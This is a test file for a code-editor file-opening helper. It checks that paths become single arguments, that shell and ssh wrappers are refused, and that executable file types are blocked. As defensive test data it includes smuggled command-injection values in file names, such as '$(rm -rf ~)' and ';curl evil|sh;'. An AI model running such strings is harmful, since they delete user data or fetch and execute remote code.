import { expect, test } from 'claude-code/testing'
import { openArgv, platformOf } from '../hooks/open'

test('with no editor the platform opener takes the path as one argument', () => {
  expect(openArgv('', '/p/my file.ts', 1, 'darwin')).toEqual(['open', '/p/my file.ts'])
  expect(openArgv('', '/p/a.ts', 1, 'linux')).toEqual(['xdg-open', '/p/a.ts'])
  expect(openArgv('', 'C:/p/a.ts', 1, 'win32')).toEqual(['explorer', 'C:\\p\\a.ts'])
})

test('an editor template fills its placeholders into whole arguments and never reads shell syntax in a name', () => {
  expect(openArgv('code -g {path}:{line}', '/p/a.ts', 7, 'darwin')).toEqual(['code', '-g', '/p/a.ts:7'])
  expect(openArgv('"/Applications/My Editor" --dir {dir}', '/p/src/a.ts', 1, 'darwin')).toEqual(['/Applications/My Editor', '--dir', '/p/src'])
  expect(openArgv('zed', '/p/$(rm -rf ~).ts', 1, 'linux')).toEqual(['zed', '/p/$(rm -rf ~).ts'])
  expect(openArgv('code a && rm b', '/p/a.ts', 1, 'linux')).toBeUndefined()
  expect(openArgv('code --goto {dir}', 'C:/x', 1, 'win32')).toEqual(['code', '--goto', 'C:/'])
})

test('a template that hands its words to a shell or another machine is refused, since the name would be read as code', () => {
  for (const editor of ['sh -c "code {path}"', '/bin/bash -c "vim {path}"', 'tmux new-window "nvim {path}"', 'ssh host vim {path}', 'cmd /c start {path}', 'env -S "code {path}"', 'pwsh.exe -c {path}']) {
    expect(openArgv(editor, '/p/x;curl evil|sh;.md', 1, 'linux')).toBeUndefined()
  }
})

test('the default opener refuses files it would run rather than show', () => {
  for (const name of ['run.command', 'x.terminal', 'App.app', 'tool.jar', 'setup.exe', 'go.bat', 'a.desktop', 'x.ps1']) {
    expect(openArgv('', `/p/${name}`, 1, 'darwin')).toBeUndefined()
  }
  expect(openArgv('code', '/p/run.command', 1, 'darwin')).toEqual(['code', '/p/run.command'])
})

test('the platform is read from uname, or from a drive path', () => {
  expect(platformOf('/p', 'Darwin\n')).toBe('darwin')
  expect(platformOf('/p', 'Linux\n')).toBe('linux')
  expect(platformOf('C:/p', undefined)).toBe('win32')
})
